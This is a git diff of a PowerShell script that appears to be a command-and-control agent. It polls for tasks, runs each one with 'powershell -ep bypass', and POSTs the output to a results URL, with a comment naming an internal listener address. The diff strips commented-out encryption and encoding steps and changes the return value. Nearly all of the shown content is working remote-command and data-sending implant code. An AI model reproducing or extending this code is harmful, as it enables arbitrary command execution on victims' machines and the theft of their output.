@@ -65,9 +65,9 @@ function Invoke-Executable {
         "StdErr"   = $oStdErrBuilder.ToString().Trim()
     })
 
-    return $oResult
+    return $oResult.StdOut,$oResult.StdErr
 }
-
+###Usage:
 #Invoke-Executable -sExeFile 'powershell' -cArgs @('/c', 'systeminfo')
 
 
@@ -102,23 +102,9 @@ for (;;){
     
     if (-Not [string]::IsNullOrEmpty($task)){
         
-        # $task = Decrypt $key $task
-    # $task = $task.split()  # task=['VALID','shell','dir']
-        # $arguments   = $task[0..$task.Length]
-    
-        # foreach ($a in $arguments){ $arg += $a + " " }
-
-        # $res  = shell $f $arg
-
-        # $Bytes = [System.Text.Encoding]::Unicode.GetBytes($res)
-        # $EncodedText =[Convert]::ToBase64String($Bytes)
-        # $res  = Encrypt $key $res
-        # $encodedURL = [System.Web.HttpUtility]::UrlEncode($EncodedText) 
         $result = Invoke-Executable -sExeFile 'powershell' -cArgs @('-ep bypass /c', $task)
-        # $Bytes = [System.Text.Encoding]::Unicode.GetBytes($result)
-        # $EncodedText =[Convert]::ToBase64String($Bytes)
         $data = @{result = "$result"}
-        
+        # encryption aes
         Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
         #http://192.168.71.142:8000/results/GTLBHU/
 
